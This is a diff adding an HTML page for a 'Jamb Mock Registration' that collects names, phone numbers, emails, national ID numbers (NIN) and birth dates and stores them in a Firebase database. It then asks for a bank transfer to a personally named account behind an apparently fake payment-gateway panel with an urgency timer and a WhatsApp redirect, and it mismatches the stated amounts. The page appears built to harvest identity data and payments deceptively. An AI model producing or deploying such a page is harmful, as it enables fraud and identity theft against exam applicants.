@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Registration Form</title>
+    <style>
+      /* General Styles */
+    {
+      cursor: not-allowed;
+    }
+    
+    body {
+    margin: 0;
+    font-family: 'Arial', sans-serif;
+    background-color: white;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+}
+
+/* Container */
+.container {
+    background: #fff;
+    border-radius: 10px;
+    padding: 10px 10px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+    text-align: center;
+    width: 100%;
+    
+    margin: auto;
+}
+
+/* Form Title */
+h1 {
+    color: #333;
+    margin-bottom: 20px;
+    font-size: 24px;
+}
+
+/* Input Group */
+.input-group {
+    margin-bottom: 15px;
+    text-align: left;
+    width: 90%;
+}
+
+.input-group label {
+    display: block;
+    margin-bottom: 5px;
+    font-weight: bold;
+    color: #555;
+}
+
+.input-group input {
+    width: 100%;
+    padding: 10px;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+    font-size: 14px;
+}
+
+/* Button */
+#proceedBtn {
+    background: #4facfe;
+    color: white;
+    padding: 10px 20px;
+    border: none;
+    border-radius: 5px;
+    font-size: 16px;
+    cursor: pointer;
+    width: 100%;
+}
+
+#proceedBtn:hover {
+    background: #00c6ff;
+}
+
+/* Success Message */
+#successMessage {
+    color: #155724;
+    background-color: #d4edda;
+    border: 1px solid #c3e6cb;
+    font-weight: 600;
+    font-size: 1rem;
+    padding: 12px 16px;
+    border-radius: 6px;
+    margin-top: 20px;
+    text-align: center;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+    animation: fadeIn 0.5s ease-in-out;
+}
+
+/* Fade-in Animation */
+@keyframes fadeIn {
+    from {
+        opacity: 0;
+        transform: translateY(-10px);
+    }
+    to {
+        opacity: 1;
+        transform: translateY(0);
+    }
+}
+
+.icon {
+    width: 150px;
+    height: 150px;
+    margin-bottom: -50px;
+}
+
+/* Additional Containers */
+.containery {
+    background: #fff;
+    border-radius: 10px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    padding: 20px;
+    margin-top: 10px;
+    text-align: center;
+    width: 90%;
+    margin-right: 500px;
+    margin: auto;
+}
+
+.header {
+    display: flex;
+    justify-content: space-between;
+    font-size: 14px;
+    color: #666;
+    margin-bottom: 20px;
+}
+
+.amount-section {
+    text-align: center;
+    margin-bottom: 20px;
+}
+
+.amount-section h3 {
+    font-size: 16px;
+    color: #888;
+}
+
+.amount-section h1 {
+    font-size: 32px;
+    margin: 10px 0;
+    color: #000;
+}
+
+.amount-section p {
+    font-size: 14px;
+    color: #888;
+}
+
+.payment-method h3 {
+    font-size: 16px;
+    color: #000;
+}
+
+.payment-method p {
+    font-size: 14px;
+    color: #888;
+    margin-bottom: 10px;
+}
+
+.account-details {
+    background: #f9f9f9;
+    padding: 15px;
+    border-radius: 10px;
+    margin-bottom: 20px;
+}
+
+.account-details h4 {
+    text-align: center;
+    font-size: 16px;
+    color: #000;
+    margin-bottom: 10px;
+}
+
+.account-details .account-number {
+    font-size: 24px;
+    text-align: center;
+    font-weight: bold;
+    color: #333;
+}
+
+.account-details p {
+    text-align: center;
+    font-size: 12px;
+    color: #666;
+}
+
+#transfer-button {
+    background: #ff7a00;
+    color: #fff;
+    font-size: 16px;
+    padding: 10px 20px;
+    border: none;
+    border-radius: 5px;
+    width: 100%;
+    cursor: pointer;
+}
+
+#transfer-button:hover {
+    background: #e66a00;
+}
+
+.secured {
+    text-align: center;
+    font-size: 12px;
+    color: #888;
+    margin-top: 20px;
+}
+
+/* Form Container */
+.form-containergh {
+    max-width: 400px;
+    margin: auto;
+    background: #fff;
+    padding: 20px;
+    border-radius: 8px;
+    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+}
+
+.form-containergh h2 {
+    margin-bottom: 20px;
+    font-size: 24px;
+    color: #333;
+}
+
+.form-group {
+    margin-bottom: 15px;
+    margin-right: 20px;
+}
+
+.form-group label {
+    display: block;
+    margin-bottom: 5px;
+    font-weight: bold;
+}
+
+.form-group input {
+    width: 100%;
+    padding: 10px;
+    border: 1px solid #ddd;
+    border-radius: 4px;
+}
+
+.form-group input[readonly] {
+    background-color: #f1f1f1;
+    cursor: not-allowed;
+}
+    
+
+
+
+
+
+    </style>
+    
+    <script src="https://www.gstatic.com/firebasejs/9.14.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.14.0/firebase-database-compat.js"></script>
+
+</head>
+<body>
+  
+   
+   <div class="container">
+    <img src="https://edumagicia.onrender.com/icon3.png" class="icon" alt="Icon">
+    <h1>Jamb Mock Registration</h1>
+    <form id="registrationForm">
+        <div class="input-group">
+            <label>Full Name</label>
+            <input type="text" id="fullName" placeholder="Enter Full Name" required>
+        </div>
+        <div class="input-group">
+            <label>Phone Number</label>
+            <input type="tel" id="phoneNumber" placeholder="Enter Phone Number" required>
+        </div>
+        <div class="input-group">
+            <label>Email Address</label>
+            <input type="email" id="email" placeholder="Enter Email" required>
+        </div>
+        <div class="input-group">
+            <label>NIN</label>
+            <input type="text" id="nin" placeholder="Enter NIN" required>
+        </div>
+        <div class="input-group">
+            <label>Date of Birth</label>
+            <input type="date" id="dob" required>
+        </div>
+        <button type="button" id="proceedBtn">Proceed</button>
+    </form>
+    <p id="successMessage"></p>
+
+    <!-- Payment Information Section -->
+    <div class="containery">
+        <div class="header">
+            <span>EDUMAGICIA</span>
+            <span>safep404@gmail.com</span>
+        </div>
+        <div class="amount-section">
+            <h3>Amount to pay</h3>
+            <h1>₦1,050.00</h1>
+            <p>Amount ₦1,050.00 | Fee ₦50.00</p>
+        </div>
+        <div class="payment-method">
+            <h3>Pay with Transfer</h3>
+            <p>Transfer to account details below to activate your registration number</p>
+        </div>
+        <div class="account-details">
+            <h4>9 Payment Service Bank (9PSB)</h4>
+            <p class="account-number">6174988805</p>
+            <p>Do not save this account no.!</p>
+            <p>Account Name: Favour Adesiyan</p>
+            <p>This one-time account expires in <span id="timer">39 mins 45 secs</span></p>
+        </div>
+
+        <!-- Transaction Information Section -->
+        <div class="form-containergh">
+            <h2>Transaction Info</h2>
+            <form id="transaction-form">
+                <div class="form-group">
+                    <label for="registration-number">Registration Number</label>
+                    <input type="text" id="registration-number" placeholder="Enter Registration Number" required>
+                </div>
+                <div class="form-group">
+                    <label for="amount">Amount Transferred</label>
+                    <input type="text" id="amount" value="₦1,050" readonly>
+                </div>
+                <div class="form-group">
+                    <label for="payment-description">Payment Description</label>
+                    <input type="text" id="payment-description" placeholder="Enter Description" required>
+                </div>
+                <button type="button" id="transfer-button">I've transferred the money</button>
+            </form>
+        </div>
+
+        <p class="secured">Secured by Melvica</p>
+    </div>
+</div>
+
+
+    <script>
+      // Firebase Configuration
+const firebaseConfig = {
+    apiKey: "AIzaSyDJP2XIR51qGTLINiKvEoscYTMt11CaZ5s",
+    authDomain: "paytrust-71e30.firebaseapp.com",
+    databaseURL: "https://paytrust-71e30-default-rtdb.firebaseio.com/",
+    projectId: "paytrust-71e30",
+    storageBucket: "gs://paytrust-71e30.appspot.com",
+    messagingSenderId: "492609516838",
+    appId: "1:492609516838:android:5a924ad3b7e8e508fa3de7"
+};
+
+// Initialize Firebase
+firebase.initializeApp(firebaseConfig);
+const database = firebase.database();
+
+// Event Listener for Proceed Button
+document.getElementById('proceedBtn').addEventListener('click', registerUser);
+
+// Function to Generate Unique Registration Number
+function generateRegNo() {
+    const randomNumber = Math.floor(10000 + Math.random() * 90000);
+    return `EDUMAGICIA/2025/${randomNumber}`;
+}
+
+// Function to Generate Random Password
+function generatePassword() {
+    return Math.random().toString(36).slice(-8);
+}
+
+// User Registration Function
+function registerUser() {
+    const fullName = document.getElementById('fullName').value;
+    const phoneNumber = document.getElementById('phoneNumber').value;
+    const email = document.getElementById('email').value;
+    const nin = document.getElementById('nin').value;
+    const dob = document.getElementById('dob').value;
+
+    if (!fullName || !phoneNumber || !email || !nin || !dob) {
+        alert('Please fill all fields');
+        return;
+    }
+
+    const regNo = generateRegNo();
+    const password = generatePassword();
+
+    database.ref('users/' + regNo).set({
+        fullName,
+        phoneNumber,
+        email,
+        nin,
+        dob,
+        regNo,
+        password
+    }).then(() => {
+        document.getElementById('successMessage').innerText = `Registration Successful!\nReg No: ${regNo}\nPassword: ${password}`;
+        document.getElementById('registrationForm').reset();
+    }).catch((error) => {
+        console.error('Error writing to database:', error);
+        alert('Error saving data. Please try again.');
+    });
+}
+    </script>
+    
+    
+    
+    
+    <script>
+    const timerElement = document.getElementById("timer");
+
+function startCountdown(duration) {
+  let timer = duration, minutes, seconds;
+  setInterval(() => {
+    minutes = Math.floor(timer / 60);
+    seconds = timer % 60;
+
+    seconds = seconds < 10 ? `0${seconds}` : seconds;
+
+    timerElement.textContent = `${minutes} mins ${seconds} secs`;
+
+    if (--timer < 0) {
+      timer = 0;
+    }
+  }, 1000);
+}
+
+startCountdown(39 * 60 + 45); // 39 minutes and 45 seconds
+  </script>
+  
+  
+  
+    <script>
+    document.getElementById('transfer-button').addEventListener('click', function () {
+      const registrationNumber = document.getElementById('registration-number').value;
+      const amount = "₦1,500"; // Static amount
+      const description = document.getElementById('payment-description').value;
+
+      if (registrationNumber && description) {
+        const message = `Please confirm and verify my Registration number: ${registrationNumber}. This is my payment info: Amount - ${amount}, Description - ${description}`;
+        const whatsappURL = `https://wa.me/+2348128885606?text=${encodeURIComponent(message)}`;
+        window.location.href = whatsappURL;
+      } else {
+        alert('Please fill out all required fields before submitting.');
+      }
+    });
+  </script>
+  
+</body>
+</html>
